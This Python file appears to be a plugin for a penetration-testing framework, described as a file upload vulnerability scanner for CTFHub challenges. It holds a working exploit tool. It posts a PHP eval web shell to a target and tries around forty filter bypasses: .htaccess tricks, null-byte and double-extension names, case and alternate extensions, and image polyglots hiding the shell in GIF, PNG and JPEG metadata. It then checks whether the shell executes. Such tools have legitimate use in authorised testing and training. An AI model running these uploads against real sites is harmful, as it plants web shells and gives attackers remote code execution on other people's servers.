import json
import struct
import re
import zlib
from typing import Any, AsyncIterator

import httpx

from app.plugins.base import PluginBase, PluginEvent, PluginMeta

# Minimal valid image files for bypass tests
GIF_HEADER = b"GIF89a"
PNG_HEADER = (
    b"\x89PNG\r\n\x1a\n"  # PNG signature
    + struct.pack(">I", 13) + b"IHDR"
    + struct.pack(">II", 1, 1)  # 1x1 pixel
    + b"\x08\x02"  # 8-bit RGB
    + b"\x00\x00\x00"  # compression, filter, interlace
)
# Calculate CRC for IHDR
_ihdr_data = PNG_HEADER[12:]  # from "IHDR" onward (4+13 = 17 bytes)
PNG_HEADER += struct.pack(">I", zlib.crc32(_ihdr_data) & 0xFFFFFFFF)

JPEG_HEADER = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
BMP_HEADER = b"BM" + b"\x00" * 10 + b"\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00"

# EXIF JPEG (for exif_imagetype bypass)
EXIF_HEADER = b"\xff\xd8\xff\xe1\x00\x2aExif\x00\x00MM\x00\x2a\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00"


class FileUpload(PluginBase):
    meta = PluginMeta(
        name="file-upload",
        version="1.0.0",
        description="File upload vulnerability scanner",
        category="vuln",
        engine="python",
    )

    async def execute(self, params: dict[str, Any]) -> AsyncIterator[PluginEvent]:
        url = params["url"].strip()
        file_field = params.get("file_field", "file").strip()
        cookie = params.get("cookie", "").strip()
        verify_tpl = params.get("verify_url", "").strip()
        shell = params.get("webshell_content", "<?php @eval($_POST['cmd']); ?>").strip()
        success_marker = params.get("success_marker", "").strip()
        timeout = int(params.get("timeout", 10))

        extra_fields: dict[str, str] = {}
        raw_extra = params.get("extra_fields", "").strip()
        if raw_extra:
            try:
                extra_fields = json.loads(raw_extra)
            except json.JSONDecodeError:
                yield PluginEvent(type="log", data={"msg": "Warning: invalid JSON in extra_fields"})

        shell_bytes = shell.encode()
        found = 0

        yield PluginEvent(type="log", data={"msg": f"File upload scan: {url}"})
        yield PluginEvent(type="progress", data={"percent": 0, "msg": "Preparing tests..."})

        # ── Test cases ──
        tests = self._build_tests(shell_bytes)
        total = len(tests)

        headers: dict[str, str] = {}
        if cookie:
            headers["Cookie"] = cookie

        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            for i, test in enumerate(tests):
                name = test["name"]
                filename = test["filename"]
                content = test["content"]
                ct = test["content_type"]

                yield PluginEvent(type="log", data={
                    "msg": f"\n  [{i+1}/{total}] {name}: {filename} ({ct})"
                })

                try:
                    # Build multipart
                    files = {file_field: (filename, content, ct)}
                    data = extra_fields.copy()

                    resp = await client.post(url, files=files, data=data, headers=headers)

                    upload_ok = self._check_upload_success(resp, success_marker)
                    status = "Uploaded" if upload_ok else f"Rejected ({resp.status_code})"

                    accessible = False
                    access_evidence = ""
                    if upload_ok and verify_tpl:
                        accessible, access_evidence = await self._verify_access(
                            client, verify_tpl, filename, headers
                        )

                    evidence_parts = []
                    if upload_ok:
                        evidence_parts.append(f"HTTP {resp.status_code}")
                        # Try to extract upload path from response
                        path = self._extract_path(resp.text, filename)
                        if path:
                            evidence_parts.append(f"Path: {path}")
                    if accessible:
                        evidence_parts.append(access_evidence)
                    evidence = "; ".join(evidence_parts) if evidence_parts else status

                    if upload_ok:
                        found += 1
                        yield PluginEvent(type="result", data={
                            "test": name,
                            "filename": filename,
                            "content_type": ct,
                            "status": status,
                            "accessible": "Yes" if accessible else "Unknown",
                            "evidence": evidence,
                        })
                        yield PluginEvent(type="log", data={
                            "msg": f"    [VULN] Upload accepted! {evidence}"
                        })
                    else:
                        yield PluginEvent(type="log", data={"msg": f"    Blocked: {status}"})

                except Exception as e:
                    yield PluginEvent(type="log", data={"msg": f"    Error: {e}"})

                pct = min((i + 1) * 100 // total, 99)
                yield PluginEvent(type="progress", data={"percent": pct, "msg": f"Tested {i+1}/{total}"})

        summary = f"Scan complete: {found}/{total} bypass methods succeeded"
        yield PluginEvent(type="log", data={"msg": f"\n{summary}"})
        yield PluginEvent(type="progress", data={"percent": 100, "msg": summary})

    def _build_tests(self, shell: bytes) -> list[dict]:
        """Build all test cases covering CTFHub file upload challenges."""
        tests = []

        # 1. No validation — direct .php upload
        tests.append({
            "name": "No validation",
            "filename": "shell.php",
            "content": shell,
            "content_type": "application/octet-stream",
        })

        # 2. Frontend validation bypass — .php with image MIME
        tests.append({
            "name": "Frontend bypass (image MIME)",
            "filename": "shell.php",
            "content": shell,
            "content_type": "image/jpeg",
        })

        # 3. .htaccess upload
        tests.append({
            "name": ".htaccess upload",
            "filename": ".htaccess",
            "content": b'AddType application/x-httpd-php .jpg\n',
            "content_type": "application/octet-stream",
        })

        # 4. MIME type bypass — .php with image/jpeg
        for mime in ["image/jpeg", "image/png", "image/gif"]:
            tests.append({
                "name": f"MIME bypass ({mime})",
                "filename": "shell.php",
                "content": shell,
                "content_type": mime,
            })

        # 5. 00 truncation (various encodings)
        for payload_name, suffix in [
            ("Null byte (%00)", "shell.php%00.jpg"),
            ("Null byte (0x00)", "shell.php\x00.jpg"),
        ]:
            tests.append({
                "name": payload_name,
                "filename": suffix,
                "content": shell,
                "content_type": "image/jpeg",
            })

        # 6. Case bypass
        for ext in [".Php", ".pHp", ".PHP", ".pHP", ".PhP", ".php5", ".phtml"]:
            tests.append({
                "name": f"Case bypass ({ext})",
                "filename": f"shell{ext}",
                "content": shell,
                "content_type": "application/octet-stream",
            })

        # 7. Dot bypass — trailing dot
        tests.append({
            "name": "Dot bypass (trailing .)",
            "filename": "shell.php.",
            "content": shell,
            "content_type": "application/octet-stream",
        })
        tests.append({
            "name": "Dot bypass (double ..)",
            "filename": "shell.php..",
            "content": shell,
            "content_type": "application/octet-stream",
        })

        # 8. Space bypass — trailing space
        tests.append({
            "name": "Space bypass (trailing space)",
            "filename": "shell.php ",
            "content": shell,
            "content_type": "application/octet-stream",
        })
        tests.append({
            "name": "Space bypass (dot+space+dot)",
            "filename": "shell.php. .",
            "content": shell,
            "content_type": "application/octet-stream",
        })

        # 9. Double-write suffix bypass
        for ext in ["shell.pphphp", "shell.phphpp", "shell.pphpphp"]:
            tests.append({
                "name": f"Double-write bypass ({ext})",
                "filename": ext,
                "content": shell,
                "content_type": "application/octet-stream",
            })

        # 10. File header checks — image headers + shell
        for hdr_name, hdr_bytes, ext, mime in [
            ("GIF89a", GIF_HEADER, ".gif", "image/gif"),
            ("PNG header", PNG_HEADER, ".png", "image/png"),
            ("JPEG header", JPEG_HEADER, ".jpg", "image/jpeg"),
            ("BMP header", BMP_HEADER, ".bmp", "image/bmp"),
        ]:
            # Image header + PHP shell
            tests.append({
                "name": f"File header ({hdr_name}) + .php",
                "filename": f"shell{ext}.php",
                "content": hdr_bytes + b"\n" + shell,
                "content_type": mime,
            })
            # Image header with image extension (for use after .htaccess)
            tests.append({
                "name": f"Image shell ({hdr_name})",
                "filename": f"shell{ext}",
                "content": hdr_bytes + b"\n" + shell,
                "content_type": mime,
            })

        # 11. getimagesize() bypass — valid image structure + shell in comment
        # GIF with trailing PHP
        tests.append({
            "name": "getimagesize() bypass (GIF+PHP)",
            "filename": "shell.gif",
            "content": GIF_HEADER + b"\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;" + b"\n" + shell,
            "content_type": "image/gif",
        })
        # PNG with PHP in tEXt chunk
        tests.append({
            "name": "getimagesize() bypass (PNG+PHP)",
            "filename": "shell.png",
            "content": self._png_with_shell(shell),
            "content_type": "image/png",
        })

        # 12. exif_imagetype() bypass — EXIF JPEG + shell
        tests.append({
            "name": "exif_imagetype() bypass (EXIF JPEG)",
            "filename": "shell.jpg",
            "content": EXIF_HEADER + b"\xff\xfe" + struct.pack(">H", len(shell) + 2) + shell + b"\xff\xd9",
            "content_type": "image/jpeg",
        })

        # 13. Secondary rendering bypass — minimal valid images with shell
        #     Even after re-rendering, some chunks or EXIF may survive
        tests.append({
            "name": "Secondary render bypass (GIF comment)",
            "filename": "shell.gif",
            "content": self._gif_with_comment(shell),
            "content_type": "image/gif",
        })
        tests.append({
            "name": "Secondary render bypass (JPEG COM)",
            "filename": "shell.jpg",
            "content": self._jpeg_with_comment(shell),
            "content_type": "image/jpeg",
        })

        # 14. Additional extensions
        for ext in [".php3", ".php4", ".php7", ".pht", ".phps", ".phar", ".inc",
                     ".shtml", ".jsp", ".jspx", ".asp", ".aspx", ".cer", ".asa",
                     ".cgi", ".war"]:
            tests.append({
                "name": f"Alternative ext ({ext})",
                "filename": f"shell{ext}",
                "content": shell,
                "content_type": "application/octet-stream",
            })

        # 15. Double extension
        for combo in ["shell.php.jpg", "shell.php.png", "shell.jpg.php",
                       "shell.php;.jpg", "shell.php::$DATA"]:
            tests.append({
                "name": f"Double ext ({combo})",
                "filename": combo,
                "content": shell,
                "content_type": "image/jpeg",
            })

        return tests

    def _png_with_shell(self, shell: bytes) -> bytes:
        """Build minimal valid PNG with PHP code in a tEXt chunk."""
        # PNG signature + IHDR
        ihdr_data = struct.pack(">II", 1, 1) + b"\x08\x02\x00\x00\x00"
        ihdr_crc = struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
        ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc

        # tEXt chunk with shell
        text_payload = b"Comment\x00" + shell
        text_crc = struct.pack(">I", zlib.crc32(b"tEXt" + text_payload) & 0xFFFFFFFF)
        text = struct.pack(">I", len(text_payload)) + b"tEXt" + text_payload + text_crc

        # IDAT (minimal)
        raw_scanline = b"\x00\x00\x00\x00"  # filter=None, 1 pixel RGB
        compressed = zlib.compress(raw_scanline)
        idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + compressed) & 0xFFFFFFFF)
        idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed + idat_crc

        # IEND
        iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
        iend = struct.pack(">I", 0) + b"IEND" + iend_crc

        return b"\x89PNG\r\n\x1a\n" + ihdr + text + idat + iend

    def _gif_with_comment(self, shell: bytes) -> bytes:
        """Build minimal valid GIF89a with shell in comment extension."""
        # Header + Logical Screen Descriptor (1x1, no GCT)
        header = b"GIF89a\x01\x00\x01\x00\x00\x00\x00"
        # Comment Extension
        comment = b"\x21\xfe"
        data = shell[:255]  # GIF comment sub-block max 255
        comment += bytes([len(data)]) + data + b"\x00"
        # Minimal image data
        image = b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00"
        trailer = b"\x3b"
        return header + comment + image + trailer

    def _jpeg_with_comment(self, shell: bytes) -> bytes:
        """Build JPEG with shell in COM (comment) marker."""
        soi = b"\xff\xd8"
        # COM marker
        com_len = len(shell) + 2
        com = b"\xff\xfe" + struct.pack(">H", com_len) + shell
        # Minimal JPEG body (SOF0 + SOS + EOI stub)
        eoi = b"\xff\xd9"
        # Add JFIF APP0 for validity
        app0 = b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        return soi + app0 + com + eoi

    def _check_upload_success(self, resp: httpx.Response, marker: str) -> bool:
        """Determine if the upload was accepted."""
        if resp.status_code >= 400:
            return False
        if marker and marker in resp.text:
            return True
        if not marker:
            # Heuristics: if 200 and no obvious error keywords
            if resp.status_code == 200:
                lower = resp.text.lower()
                reject_words = ["不允许", "forbidden", "invalid", "not allowed",
                                "error", "reject", "illegal", "禁止", "失败",
                                "not permitted", "blocked"]
                if not any(w in lower for w in reject_words):
                    return True
        return False

    def _extract_path(self, text: str, filename: str) -> str | None:
        """Try to find upload path in response."""
        # Common patterns: /upload/xxx.php, ./uploads/xxx
        patterns = [
            r'["\']?(/(?:upload|uploads|images|files|static)[^"\'<>\s]*)',
            r'(?:src|href|path|url)["\s:=]+["\']?([^"\'<>\s]+)',
        ]
        for pat in patterns:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    async def _verify_access(
        self, client: httpx.AsyncClient, tpl: str, filename: str,
        headers: dict[str, str],
    ) -> tuple[bool, str]:
        """Check if uploaded file is accessible and executable."""
        # Clean filename for URL (remove null bytes, spaces etc.)
        clean = filename.replace("\x00", "").replace(" ", "").rstrip(".")
        check_url = tpl.replace("{filename}", clean)
        try:
            r = await client.get(check_url, headers=headers)
            if r.status_code == 200:
                if "<?php" not in r.text:
                    # PHP was executed (source not visible)
                    return True, f"Executed at {check_url}"
                else:
                    return True, f"Accessible but not executed: {check_url}"
            return False, f"HTTP {r.status_code}"
        except Exception as e:
            return False, f"Verify error: {e}"
